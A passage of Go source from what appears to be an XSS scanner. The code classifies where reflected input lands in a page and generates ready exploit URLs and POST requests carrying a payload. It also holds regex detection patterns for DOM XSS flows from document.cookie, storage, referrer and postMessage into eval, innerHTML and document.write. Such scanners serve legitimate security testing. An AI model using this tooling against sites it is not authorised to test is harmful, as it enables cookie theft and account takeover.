	if regexp.MustCompile(`<script[^>]*>.*` + regexp.QuoteMeta(testValueLower) + `.*</script>`).MatchString(contextAreaLower) {
		return string(ContextScriptTag)
	}

	// Check for other HTML contexts (div, span, p, etc.)
	if regexp.MustCompile(`<(?:div|span|p|h[1-6]|li|td|th|label|strong|em|b|i|u)[^>]*>.*` + regexp.QuoteMeta(testValueLower) + `.*</(?:div|span|p|h[1-6]|li|td|th|label|strong|em|b|i|u)>`).MatchString(contextAreaLower) {
		return string(ContextHTMLBody)
	}

	// Check for comment context
	if regexp.MustCompile(`<!--.*` + regexp.QuoteMeta(testValueLower) + `.*-->`).MatchString(contextAreaLower) {
		return string(ContextHTMLComment) // Comments can be broken out of with -->
	}

	// Check for JSON context - parameter reflected as JSON value
	if regexp.MustCompile(`"[^"]*"\s*:\s*["']` + regexp.QuoteMeta(testValueLower) + `["']`).MatchString(contextAreaLower) {
		return string(ContextJSON)
	}

	// Check for XML context
	if regexp.MustCompile(`<[^>]*>.*` + regexp.QuoteMeta(testValueLower) + `.*</[^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLBody)
	}

	// If we can't determine the context, check if it's at least in the HTML body
	if strings.Contains(bodyLower, testValueLower) {
		return string(ContextHTMLBody)
	}

	// Default to unknown context
	return string(ContextUnknown)
}

// determineExploitability determines if a vulnerability is directly exploitable
func (s *Scanner) determineExploitability(context HTMLContext) (bool, bool) {
	switch context {
	case ContextHTMLBody:
		return true, false
	case ContextHTMLAttribute:
		return true, false
	case ContextHTMLAttributeDoubleQuoted:
		return true, false
	case ContextHTMLAttributeSingleQuoted:
		return true, false
	case ContextHTMLAttributeUnquoted:
		return true, false
	case ContextJavaScript:
		return true, false
	case ContextCSS:
		return true, false
	case ContextURL:
		return true, false
	case ContextHTMLTitle:
		return true, false // Title context is exploitable with proper breakout payloads
	case ContextHTMLComment:
		return true, false // HTML comment context is exploitable with proper breakout payloads
	case ContextTextarea:
		return true, false // Textarea context is exploitable with proper breakout payloads
	case ContextTextareaAttribute:
		return true, false // Textarea attribute context is exploitable with proper breakout payloads
	case ContextNoscript:
		return true, false // Noscript context is exploitable with proper breakout payloads
	case ContextStyleAttribute:
		return true, false // Style attribute context is exploitable with proper breakout payloads
	case ContextHTMLAttributeName:
		return true, false // HTML attribute name context is exploitable with proper breakout payloads
	case ContextHTMLAttributeNameUnquoted:
		return true, false // Unquoted HTML attribute name context is exploitable with proper breakout payloads
	case ContextHTMLEscaped:
		return true, false // HTML escaped context is exploitable with proper breakout payloads
	case ContextDOM, ContextDOMDocumentWriteln, ContextDOMBased:
		return true, false // DOM-based XSS contexts are exploitable with proper breakout payloads
	case ContextJSAssignment:
		return true, false // JavaScript variable assignment is exploitable
	case ContextJSRegex:
		return true, false // JavaScript regex context is exploitable
	case ContextJSComment:
		return true, false // JavaScript comment context is exploitable
	case ContextScriptTag:
		return true, false // Script tag context is exploitable
	case ContextScriptSrcAttribute:
		return true, false // Script src attribute context is exploitable
	case ContextCSSExpression:
		return true, false // CSS expression injection is exploitable
	case ContextAttribute:
		return true, false // Attribute context is exploitable
	case ContextIframeAttribute:
		return true, false // Iframe attribute context is exploitable
	case ContextJSON:
		return true, false // JSON context is exploitable with proper breakout payloads
	case ContextUnknown:
		return false, true // Unknown context requires manual intervention
	default:
		return false, true
	}
}

// generateExploitURL creates a direct exploit URL or POST request description
func (s *Scanner) generateExploitURL(parsedURL *url.URL, param Parameter, payload string) string {
	// For form parameters, return POST request description
	if param.Type == "form" {
		return fmt.Sprintf("POST %s\nContent-Type: application/x-www-form-urlencoded\n\n%s=%s", 
			parsedURL.String(), param.Name, url.QueryEscape(payload))
	}
	
	// Parse the original URL to preserve parameter order
	originalURL := parsedURL.String()
	
	// Find the parameter in the original URL and replace its value
	queryStart := strings.Index(originalURL, "?")
	if queryStart == -1 {
		// No query parameters, add the parameter
		return originalURL + "?" + param.Name + "=" + url.QueryEscape(payload)
	}
	
	// Extract the base URL and query string
	baseURL := originalURL[:queryStart+1]
	queryString := originalURL[queryStart+1:]
	
	// Parse query parameters while preserving order
	var queryParts []string
	params := strings.Split(queryString, "&")
	
	paramFound := false
	for _, paramStr := range params {
		if paramStr == "" {
			continue
		}
		
		// Split parameter name and value
		parts := strings.SplitN(paramStr, "=", 2)
		if len(parts) == 2 {
			name := parts[0]
			
			if name == param.Name {
				// Replace this parameter's value with the payload
				queryParts = append(queryParts, name+"="+url.QueryEscape(payload))
				paramFound = true
			} else {
				// Keep the original parameter
				queryParts = append(queryParts, paramStr)
			}
		} else {
			// Malformed parameter, keep as is
			queryParts = append(queryParts, paramStr)
		}
	}
	
	// If parameter wasn't found, add it at the end
	if !paramFound {
		queryParts = append(queryParts, param.Name+"="+url.QueryEscape(payload))
	}
	
	return baseURL + strings.Join(queryParts, "&")
}

// makeRequest makes an HTTP request with configured headers
func (s *Scanner) makeRequest(url string) (*http.Response, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Add configured headers first (these take precedence)
	if !s.config.Quiet {
	for key, value := range s.config.Headers {
		req.Header.Set(key, value)
		}
	} else {
		for key, value := range s.config.Headers {
			req.Header.Set(key, value)
		}
	}
	
	// Always log headers for debugging

	// Force uncompressed content regardless of configured headers
	req.Header.Set("Accept-Encoding", "identity") // Request uncompressed content
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}
	if req.Header.Get("Accept") == "" {
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	}

	// Remove conditional headers that can cause 304 responses
	req.Header.Del("If-Modified-Since")
	req.Header.Del("If-None-Match")
	req.Header.Del("If-Unmodified-Since")
	req.Header.Del("If-Match")
	req.Header.Del("If-Range")

	if !s.config.Quiet {
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return nil, err
	}

	// If we get a 304 Not Modified, make a fresh request without any conditional headers
	if resp.StatusCode == 304 {
		if !s.config.Quiet {
		}
		resp.Body.Close()
		
		// Create a completely fresh request without any conditional headers
		freshReq, err := http.NewRequest("GET", url, nil)
		if err != nil {
			return nil, err
		}
		
		// Add only essential headers, no conditional ones
		freshReq.Header.Set("Accept-Encoding", "identity")
		freshReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		freshReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		
		// Add other non-conditional headers from config
		for key, value := range s.config.Headers {
			if key != "If-Modified-Since" && key != "If-None-Match" && 
			   key != "If-Unmodified-Since" && key != "If-Match" && key != "If-Range" {
				freshReq.Header.Set(key, value)
			}
		}
		
		resp, err = s.client.Do(freshReq)
		if err != nil {
			return nil, err
		}
	}

	if !s.config.Quiet {
	}

	return resp, nil
}

// makePostRequest makes a POST request with form data
func (s *Scanner) makePostRequest(requestURL string, paramName string, paramValue string) (*http.Response, error) {
	// Create form data
	formData := paramName + "=" + url.QueryEscape(paramValue)
	
	req, err := http.NewRequest("POST", requestURL, strings.NewReader(formData))
	if err != nil {
		return nil, err
	}

	// Set content type for form data
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	// Add configured headers
	for key, value := range s.config.Headers {
		req.Header.Set(key, value)
	}

	return s.client.Do(req)
}

// getPageContent fetches the page content
func (s *Scanner) getPageContent(url string) (string, error) {
	resp, err := s.makeRequest(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	return s.readResponseBody(resp)
}

// readResponseBody reads the response body as string
func (s *Scanner) readResponseBody(resp *http.Response) (string, error) {
	
	// Read raw body first
	bodyBytes := make([]byte, 0, 1024*1024) // 1MB buffer
	buffer := make([]byte, 4096)
	
	for {
		n, err := resp.Body.Read(buffer)
		if n > 0 {
			bodyBytes = append(bodyBytes, buffer[:n]...)
		}
		if err != nil {
			if err == io.EOF {
			break
		}
			return "", err
		}
	}

	// Check if content is compressed and decompress if needed
	contentEncoding := resp.Header.Get("Content-Encoding")
	isGzip := isGzipContent(bodyBytes)
	
	// Always show debug info for compression
	
	if contentEncoding == "gzip" || contentEncoding == "deflate" || isGzip {
		
		// Try gzip decompression
		reader, err := gzip.NewReader(bytes.NewReader(bodyBytes))
		if err != nil {
			if !s.config.Quiet {
			}
			return string(bodyBytes), nil // Return original if decompression fails
		}
		defer reader.Close()
		
		decompressed, err := io.ReadAll(reader)
		if err != nil {
			if !s.config.Quiet {
			}
			return string(bodyBytes), nil // Return original if decompression fails
		}
		
		if !s.config.Quiet {
		}
		return string(decompressed), nil
	}

	return string(bodyBytes), nil
}

// isGzipContent checks if the content appears to be gzip compressed
func isGzipContent(data []byte) bool {
	if len(data) < 2 {
		return false
	}
	// Gzip magic number: 0x1f, 0x8b
	return data[0] == 0x1f && data[1] == 0x8b
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// analyzeDOMXSSPatterns analyzes JavaScript content for DOM XSS source->sink patterns
// Returns: (found, source, sinkType)
func (s *Scanner) analyzeDOMXSSPatterns(body string) (bool, string, string) {
	// Look for patterns where document.cookie is used as source and dangerous functions as sink
	
	// Debug: Check if we have the expected patterns
	hasDocumentCookie := strings.Contains(body, "document.cookie")
	hasEval := strings.Contains(body, "eval(")
	hasLookupCookie := strings.Contains(body, "lookupCookie")
	hasInnerHTML := strings.Contains(strings.ToLower(body), "innerhtml")
	hasOuterHTML := strings.Contains(strings.ToLower(body), "outerhtml")
	hasDocumentWrite := strings.Contains(body, "document.write")
	hasWindowName := strings.Contains(body, "window.name")
	hasLocalStorage := strings.Contains(body, "localStorage")
	hasSessionStorage := strings.Contains(body, "sessionStorage")
	hasPostMessage := strings.Contains(body, "postMessage") || strings.Contains(body, "addEventListener") && strings.Contains(body, "message")
	hasEventHandlers := strings.Contains(body, "onclick") || strings.Contains(body, "onload") || strings.Contains(body, "onerror") || strings.Contains(body, "onmouseover") || strings.Contains(body, "onsubmit") || strings.Contains(body, "onchange") || strings.Contains(body, "onfocus") || strings.Contains(body, "onblur") || strings.Contains(body, "addEventListener")
	hasTypingEvents := strings.Contains(body, "oninput") || strings.Contains(body, "onkeyup") || strings.Contains(body, "onkeydown") || strings.Contains(body, "onkeypress") || strings.Contains(body, "input") && strings.Contains(body, "addEventListener")
	hasJavaScriptURI := strings.Contains(body, "javascript:") || strings.Contains(body, "location.href") && strings.Contains(body, "javascript:")
	hasLocationHash := strings.Contains(body, "location.hash")
	
	if !s.config.Quiet {
		log.Printf("DOM XSS analysis: document.cookie=%v, eval()=%v, lookupCookie=%v, innerHTML=%v, outerHTML=%v, document.write=%v, window.name=%v, localStorage=%v, sessionStorage=%v, postMessage=%v, eventHandlers=%v, typingEvents=%v, javascriptURI=%v, locationHash=%v", 
			hasDocumentCookie, hasEval, hasLookupCookie, hasInnerHTML, hasOuterHTML, hasDocumentWrite, hasWindowName, hasLocalStorage, hasSessionStorage, hasPostMessage, hasEventHandlers, hasTypingEvents, hasJavaScriptURI, hasLocationHash)
	}
	
	// Pattern 1: Direct eval(document.cookie) or eval(someFunction(document.cookie))
	evalCookiePattern := regexp.MustCompile(`eval\s*\(\s*[^)]*document\.cookie[^)]*\)`)
	if evalCookiePattern.MatchString(body) {
		return true, "document.cookie", "eval"
	}
	
	// Pattern 2: Variable assignment from document.cookie then eval()
	// Look for: var x = document.cookie; eval(x) or similar patterns
	cookieAssignmentPattern := regexp.MustCompile(`document\.cookie`)
	evalPattern := regexp.MustCompile(`eval\s*\(`)
	
	if cookieAssignmentPattern.MatchString(body) && evalPattern.MatchString(body) {
		// More sophisticated analysis could be added here to ensure they're related
		return true, "document.cookie", "eval"
	}
	
	// Pattern 3: Function calls that might process document.cookie and pass to eval
	// Look for patterns like: eval(getCookie()) or eval(parseCookie(document.cookie))
	cookieFunctionPattern := regexp.MustCompile(`eval\s*\(\s*[^)]*cookie[^)]*\)`)
	if cookieFunctionPattern.MatchString(body) {
		return true, "document.cookie", "eval"
	}
	
	// Pattern 4: Cookie lookup functions that return values used in eval
	// Look for functions that process document.cookie and return values that might be eval'd
	// This catches patterns like: lookupCookie('name') -> eval(payload)
	cookieLookupPattern := regexp.MustCompile(`lookupCookie\s*\(`)
	cookieSplitPattern := regexp.MustCompile(`document\.cookie\.split`)
	
	if cookieLookupPattern.MatchString(body) && evalPattern.MatchString(body) {
		return true, "document.cookie", "eval"
	}
	
	if cookieSplitPattern.MatchString(body) && evalPattern.MatchString(body) {
		return true, "document.cookie", "eval"
	}
	
	// Pattern 5: innerHTML/outerHTML sinks with cookie sources (case insensitive)
	innerHTMLPattern := regexp.MustCompile(`(?i)innerHTML\s*=`)
	outerHTMLPattern := regexp.MustCompile(`(?i)outerHTML\s*=`)
	documentWritePattern := regexp.MustCompile(`document\.write\s*\(`)
	
	if cookieAssignmentPattern.MatchString(body) && innerHTMLPattern.MatchString(body) {
		return true, "document.cookie", "innerHTML"
	}
	if cookieAssignmentPattern.MatchString(body) && outerHTMLPattern.MatchString(body) {
		return true, "document.cookie", "outerHTML"
	}
	if cookieAssignmentPattern.MatchString(body) && documentWritePattern.MatchString(body) {
		return true, "document.cookie", "document.write"
	}
	
	// Pattern 6: Cookie lookup with innerHTML/outerHTML/document.write
	if cookieLookupPattern.MatchString(body) && innerHTMLPattern.MatchString(body) {
		return true, "document.cookie", "innerHTML"
	}
	if cookieLookupPattern.MatchString(body) && outerHTMLPattern.MatchString(body) {
		return true, "document.cookie", "outerHTML"
	}
	if cookieLookupPattern.MatchString(body) && documentWritePattern.MatchString(body) {
		return true, "document.cookie", "document.write"
	}
	
	// Pattern 7: Any function that processes cookies and dangerous sinks exist
	// This is a broader pattern to catch complex flows
	cookieProcessingPattern := regexp.MustCompile(`document\.cookie`)
	dangerousSinks := []struct {
		pattern *regexp.Regexp
		name    string
	}{
		{evalPattern, "eval"},
		{innerHTMLPattern, "innerHTML"},
		{outerHTMLPattern, "outerHTML"},
		{documentWritePattern, "document.write"},
	}
	
	if cookieProcessingPattern.MatchString(body) {
		for _, sink := range dangerousSinks {
			if sink.pattern.MatchString(body) {
				// Additional check: look for variable assignments that might connect them
				assignmentPattern := regexp.MustCompile(`var\s+\w+\s*=.*cookie|let\s+\w+\s*=.*cookie|const\s+\w+\s*=.*cookie`)
				if assignmentPattern.MatchString(body) {
					return true, "document.cookie", sink.name
				}
			}
		}
	}

	// Referrer-based flows to various sinks
	hasDocumentReferrer := strings.Contains(body, "document.referrer")
	if hasDocumentReferrer {
		// Direct: eval(document.referrer)
		if hasEval {
			refEvalDirect := regexp.MustCompile(`eval\s*\(\s*[^)]*document\.referrer[^)]*\)`)
			if refEvalDirect.MatchString(body) {
				return true, "document.referrer", "eval"
			}
			// payload = unescape(document.referrer); eval(payload)
			refAssign := regexp.MustCompile(`(?s)payload\s*=.*document\.referrer[\s\S]*?eval\s*\(\s*payload\s*\)`)
			if refAssign.MatchString(body) {
				return true, "document.referrer", "eval"
			}
			// Generic var flow: var x = .*document.referrer ; ... eval(x)
			// This is a simplified pattern that looks for variable assignment from document.referrer followed by eval
			refVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*document\.referrer[\s\S]*?eval\s*\(`)
			if refVarFlow.MatchString(body) {
				return true, "document.referrer", "eval"
			}
		}
		
		// innerHTML sinks with document.referrer
		if hasInnerHTML {
			// Direct: element.innerHTML = document.referrer
			refInnerDirect := regexp.MustCompile(`(?i)\w+\.innerHTML\s*=\s*[^;]*document\.referrer`)
			if refInnerDirect.MatchString(body) {
				return true, "document.referrer", "innerHTML"
			}
			// Variable assignment: payload = unescape(document.referrer); element.innerHTML = payload
			refInnerAssign := regexp.MustCompile(`(?s)payload\s*=.*document\.referrer[\s\S]*?(?i)\w+\.innerHTML\s*=\s*payload`)
			if refInnerAssign.MatchString(body) {
				return true, "document.referrer", "innerHTML"
			}
			// Generic var flow: var x = .*document.referrer ; ... element.innerHTML = x
			refInnerVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*document\.referrer[\s\S]*?(?i)\w+\.innerHTML\s*=`)
			if refInnerVarFlow.MatchString(body) {
				return true, "document.referrer", "innerHTML"
			}
		}
		
		// outerHTML sinks with document.referrer
		if hasOuterHTML {
			// Direct: element.outerHTML = document.referrer
			refOuterDirect := regexp.MustCompile(`(?i)\w+\.outerHTML\s*=\s*[^;]*document\.referrer`)
			if refOuterDirect.MatchString(body) {
				return true, "document.referrer", "outerHTML"
			}
			// Variable assignment: payload = unescape(document.referrer); element.outerHTML = payload
			refOuterAssign := regexp.MustCompile(`(?s)payload\s*=.*document\.referrer[\s\S]*?(?i)\w+\.outerHTML\s*=\s*payload`)
			if refOuterAssign.MatchString(body) {
				return true, "document.referrer", "outerHTML"
			}
			// Generic var flow: var x = .*document.referrer ; ... element.outerHTML = x
			refOuterVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*document\.referrer[\s\S]*?(?i)\w+\.outerHTML\s*=`)
			if refOuterVarFlow.MatchString(body) {
				return true, "document.referrer", "outerHTML"
			}
		}
		
		// document.write sinks with document.referrer
		if hasDocumentWrite {
			// Direct: document.write(document.referrer)
			refWriteDirect := regexp.MustCompile(`document\.write\s*\(\s*[^)]*document\.referrer[^)]*\)`)
			if refWriteDirect.MatchString(body) {
				return true, "document.referrer", "document.write"
			}
			// Variable assignment: payload = unescape(document.referrer); document.write(payload)
			refWriteAssign := regexp.MustCompile(`(?s)payload\s*=.*document\.referrer[\s\S]*?document\.write\s*\(\s*payload\s*\)`)
			if refWriteAssign.MatchString(body) {
				return true, "document.referrer", "document.write"
			}
			// Generic var flow: var x = .*document.referrer ; ... document.write(x)
			refWriteVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*document\.referrer[\s\S]*?document\.write\s*\(`)
			if refWriteVarFlow.MatchString(body) {
				return true, "document.referrer", "document.write"
			}
		}
	}
	
	// Window.name-based flows to various sinks
	if hasWindowName {
		// Direct: eval(window.name)
		if hasEval {
			winEvalDirect := regexp.MustCompile(`eval\s*\(\s*[^)]*window\.name[^)]*\)`)
			if winEvalDirect.MatchString(body) {
				return true, "window.name", "eval"
			}
			// Variable assignment: payload = window.name; eval(payload)
			winAssign := regexp.MustCompile(`(?s)payload\s*=.*window\.name[\s\S]*?eval\s*\(\s*payload\s*\)`)
			if winAssign.MatchString(body) {
				return true, "window.name", "eval"
			}
			// Generic var flow: var x = .*window.name ; ... eval(x)
			// This is a simplified pattern that looks for variable assignment from window.name followed by eval
			winVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*window\.name[\s\S]*?eval\s*\(`)
			if winVarFlow.MatchString(body) {
				return true, "window.name", "eval"
			}
		}
		
		// innerHTML sinks with window.name
		if hasInnerHTML {
			// Direct: element.innerHTML = window.name
			winInnerDirect := regexp.MustCompile(`(?i)\w+\.innerHTML\s*=\s*[^;]*window\.name`)
			if winInnerDirect.MatchString(body) {
				return true, "window.name", "innerHTML"
			}
			// Variable assignment: payload = window.name; element.innerHTML = payload
			winInnerAssign := regexp.MustCompile(`(?s)payload\s*=.*window\.name[\s\S]*?(?i)\w+\.innerHTML\s*=\s*payload`)
			if winInnerAssign.MatchString(body) {
				return true, "window.name", "innerHTML"
			}
			// Generic var flow: var x = .*window.name ; ... element.innerHTML = x
			winInnerVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*window\.name[\s\S]*?(?i)\w+\.innerHTML\s*=`)
			if winInnerVarFlow.MatchString(body) {
				return true, "window.name", "innerHTML"
			}
		}
		
		// document.write sinks with window.name
		if hasDocumentWrite {
			// Direct: document.write(window.name)
			winWriteDirect := regexp.MustCompile(`document\.write\s*\(\s*[^)]*window\.name[^)]*\)`)
			if winWriteDirect.MatchString(body) {
				return true, "window.name", "document.write"
			}
			// Variable assignment: payload = window.name; document.write(payload)
			winWriteAssign := regexp.MustCompile(`(?s)payload\s*=.*window\.name[\s\S]*?document\.write\s*\(\s*payload\s*\)`)
			if winWriteAssign.MatchString(body) {
				return true, "window.name", "document.write"
			}
			// Generic var flow: var x = .*window.name ; ... document.write(x)
			winWriteVarFlow := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=\s*.*window\.name[\s\S]*?document\.write\s*\(`)
			if winWriteVarFlow.MatchString(body) {
				return true, "window.name", "document.write"
			}
		}
	}
	
	// LocalStorage-based flows to various sinks
	if hasLocalStorage {
		// Direct: eval(localStorage['key']) or eval(localStorage.getItem('key'))
		if hasEval {
			// Array access: localStorage['key'] or localStorage["key"]
			lsArrayEval := regexp.MustCompile(`eval\s*\(\s*[^)]*localStorage\s*\[[^)]*\]`)
			if lsArrayEval.MatchString(body) {
				return true, "localStorage", "eval"
			}
			// Function access: localStorage.getItem('key')
			lsFuncEval := regexp.MustCompile(`eval\s*\(\s*[^)]*localStorage\.getItem[^)]*\)`)
			if lsFuncEval.MatchString(body) {
				return true, "localStorage", "eval"
			}
			// Variable assignment: payload = localStorage['key']; eval(payload)
			lsAssignEval := regexp.MustCompile(`(?s)payload\s*=.*localStorage[\s\S]*?eval\s*\(\s*payload\s*\)`)
			if lsAssignEval.MatchString(body) {
				return true, "localStorage", "eval"
			}
			// Generic var flow: var x = localStorage[...]; eval(x)
			lsVarEval := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=.*localStorage[\s\S]*?eval\s*\(`)
			if lsVarEval.MatchString(body) {
				return true, "localStorage", "eval"
			}
		}
		
		// innerHTML sinks with localStorage
		if hasInnerHTML {
			// Function access: element.innerHTML = localStorage.getItem('key')
			lsFuncInner := regexp.MustCompile(`(?i)\w+\.innerHTML\s*=\s*[^;]*localStorage\.getItem`)
			if lsFuncInner.MatchString(body) {
				return true, "localStorage", "innerHTML"
			}
			// Array access: element.innerHTML = localStorage['key']
			lsArrayInner := regexp.MustCompile(`(?i)\w+\.innerHTML\s*=\s*[^;]*localStorage\s*\[`)
			if lsArrayInner.MatchString(body) {
				return true, "localStorage", "innerHTML"
			}
			// Variable assignment: payload = localStorage['key']; element.innerHTML = payload
			lsAssignInner := regexp.MustCompile(`(?s)payload\s*=.*localStorage[\s\S]*?(?i)\w+\.innerHTML\s*=\s*payload`)
			if lsAssignInner.MatchString(body) {
				return true, "localStorage", "innerHTML"
			}
			// Generic var flow: var x = localStorage[...]; element.innerHTML = x
			lsVarInner := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=.*localStorage[\s\S]*?(?i)\w+\.innerHTML\s*=`)
			if lsVarInner.MatchString(body) {
				return true, "localStorage", "innerHTML"
			}
		}
		
		// document.write sinks with localStorage
		if hasDocumentWrite {
			// Function access: document.write(localStorage.getItem('key'))
			lsFuncWrite := regexp.MustCompile(`document\.write\s*\(\s*[^)]*localStorage\.getItem[^)]*\)`)
			if lsFuncWrite.MatchString(body) {
				return true, "localStorage", "document.write"
			}
			// Array access: document.write(localStorage['key'])
			lsArrayWrite := regexp.MustCompile(`document\.write\s*\(\s*[^)]*localStorage\s*\[[^)]*\]`)
			if lsArrayWrite.MatchString(body) {
				return true, "localStorage", "document.write"
			}
			// Property access: document.write(localStorage.key)
			lsPropWrite := regexp.MustCompile(`document\.write\s*\(\s*[^)]*localStorage\.\w+[^)]*\)`)
			if lsPropWrite.MatchString(body) {
				return true, "localStorage", "document.write"
			}
			// Variable assignment: payload = localStorage['key']; document.write(payload)
			lsAssignWrite := regexp.MustCompile(`(?s)payload\s*=.*localStorage[\s\S]*?document\.write\s*\(\s*payload\s*\)`)
			if lsAssignWrite.MatchString(body) {
				return true, "localStorage", "document.write"
			}
			// Generic var flow: var x = localStorage[...]; document.write(x)
			lsVarWrite := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=.*localStorage[\s\S]*?document\.write\s*\(`)
			if lsVarWrite.MatchString(body) {
				return true, "localStorage", "document.write"
			}
		}
	}
	
	// SessionStorage-based flows to various sinks
	if hasSessionStorage {
		// Direct: eval(sessionStorage['key']) or eval(sessionStorage.getItem('key'))
		if hasEval {
			// Array access: sessionStorage['key'] or sessionStorage["key"]
			ssArrayEval := regexp.MustCompile(`eval\s*\(\s*[^)]*sessionStorage\s*\[[^)]*\]`)
			if ssArrayEval.MatchString(body) {
				return true, "sessionStorage", "eval"
			}
			// Function access: sessionStorage.getItem('key')
			ssFuncEval := regexp.MustCompile(`eval\s*\(\s*[^)]*sessionStorage\.getItem[^)]*\)`)
			if ssFuncEval.MatchString(body) {
				return true, "sessionStorage", "eval"
			}
			// Variable assignment: payload = sessionStorage['key']; eval(payload)
			ssAssignEval := regexp.MustCompile(`(?s)payload\s*=.*sessionStorage[\s\S]*?eval\s*\(\s*payload\s*\)`)
			if ssAssignEval.MatchString(body) {
				return true, "sessionStorage", "eval"
			}
			// Generic var flow: var x = sessionStorage[...]; eval(x)
			ssVarEval := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=.*sessionStorage[\s\S]*?eval\s*\(`)
			if ssVarEval.MatchString(body) {
				return true, "sessionStorage", "eval"
			}
		}
		
		// innerHTML sinks with sessionStorage
		if hasInnerHTML {
			// Function access: element.innerHTML = sessionStorage.getItem('key')
			ssFuncInner := regexp.MustCompile(`(?i)\w+\.innerHTML\s*=\s*[^;]*sessionStorage\.getItem`)
			if ssFuncInner.MatchString(body) {
				return true, "sessionStorage", "innerHTML"
			}
			// Array access: element.innerHTML = sessionStorage['key']
			ssArrayInner := regexp.MustCompile(`(?i)\w+\.innerHTML\s*=\s*[^;]*sessionStorage\s*\[`)
			if ssArrayInner.MatchString(body) {
				return true, "sessionStorage", "innerHTML"
			}
			// Variable assignment: payload = sessionStorage['key']; element.innerHTML = payload
			ssAssignInner := regexp.MustCompile(`(?s)payload\s*=.*sessionStorage[\s\S]*?(?i)\w+\.innerHTML\s*=\s*payload`)
			if ssAssignInner.MatchString(body) {
				return true, "sessionStorage", "innerHTML"
			}
			// Generic var flow: var x = sessionStorage[...]; element.innerHTML = x
			ssVarInner := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=.*sessionStorage[\s\S]*?(?i)\w+\.innerHTML\s*=`)
			if ssVarInner.MatchString(body) {
				return true, "sessionStorage", "innerHTML"
			}
		}
		
		// document.write sinks with sessionStorage
		if hasDocumentWrite {
			// Function access: document.write(sessionStorage.getItem('key'))
			ssFuncWrite := regexp.MustCompile(`document\.write\s*\(\s*[^)]*sessionStorage\.getItem[^)]*\)`)
			if ssFuncWrite.MatchString(body) {
				return true, "sessionStorage", "document.write"
			}
			// Array access: document.write(sessionStorage['key'])
			ssArrayWrite := regexp.MustCompile(`document\.write\s*\(\s*[^)]*sessionStorage\s*\[[^)]*\]`)
			if ssArrayWrite.MatchString(body) {
				return true, "sessionStorage", "document.write"
			}
			// Property access: document.write(sessionStorage.key)
			ssPropWrite := regexp.MustCompile(`document\.write\s*\(\s*[^)]*sessionStorage\.\w+[^)]*\)`)
			if ssPropWrite.MatchString(body) {
				return true, "sessionStorage", "document.write"
			}
			// Variable assignment: payload = sessionStorage['key']; document.write(payload)
			ssAssignWrite := regexp.MustCompile(`(?s)payload\s*=.*sessionStorage[\s\S]*?document\.write\s*\(\s*payload\s*\)`)
			if ssAssignWrite.MatchString(body) {
				return true, "sessionStorage", "document.write"
			}
			// Generic var flow: var x = sessionStorage[...]; document.write(x)
			ssVarWrite := regexp.MustCompile(`(?s)(var|let|const)\s+(\w+)\s*=.*sessionStorage[\s\S]*?document\.write\s*\(`)
			if ssVarWrite.MatchString(body) {
				return true, "sessionStorage", "document.write"
			}
		}
	}
	
	// PostMessage-based flows to various sinks
	if hasPostMessage {
		// Look for addEventListener('message', ...) patterns
		// Pattern 1: Inline function: addEventListener('message', function(e) { ... })
		messageListenerPattern := regexp.MustCompile(`(?s)addEventListener\s*\(\s*['"]message['"][\s\S]*?function\s*\([^)]*\)\s*\{[\s\S]*?\}`)
		listeners := messageListenerPattern.FindAllString(body, -1)
		
		// Pattern 2: Function reference: addEventListener('message', functionName, ...)
		// Look for function definitions that are used as message handlers
		functionRefPattern := regexp.MustCompile(`(?s)addEventListener\s*\(\s*['"]message['"][\s\S]*?(\w+)\s*[,\)]`)
		functionRefs := functionRefPattern.FindAllStringSubmatch(body, -1)
		
		// Check inline listeners
		for _, listener := range listeners {
			if s.checkPostMessageHandler(listener, hasEval, hasInnerHTML, hasDocumentWrite) {
				return true, "postMessage", s.getPostMessageSinkType(listener, hasEval, hasInnerHTML, hasDocumentWrite)
			}
		}
		
		// Check function reference handlers
		for _, match := range functionRefs {
			if len(match) > 1 {
				functionName := match[1]
				// Look for the function definition
				functionDefPattern := regexp.MustCompile(`(?s)(?:var|let|const|function)\s+` + regexp.QuoteMeta(functionName) + `\s*[=\s]*function[^{]*\{[\s\S]*?\}`)
				functionDef := functionDefPattern.FindString(body)
				if functionDef != "" {
					if s.checkPostMessageHandler(functionDef, hasEval, hasInnerHTML, hasDocumentWrite) {
						return true, "postMessage", s.getPostMessageSinkType(functionDef, hasEval, hasInnerHTML, hasDocumentWrite)
					}
				}
			}
		}
		
		// Also check for direct postMessage usage patterns
		// Look for patterns like: window.postMessage(data, '*') or similar
		postMessagePattern := regexp.MustCompile(`postMessage\s*\([^)]*['"]\*['"]`)
		if postMessagePattern.MatchString(body) {
			// This indicates sending to any origin, which could be dangerous
			// Check if the data being sent is used in dangerous sinks
			if hasEval || hasInnerHTML || hasDocumentWrite {
				return true, "postMessage", "complex_message"
			}
		}
	}
	
	// Event-triggered XSS patterns
	if hasEventHandlers {
		// Pattern 1: Inline event handlers with dangerous sinks
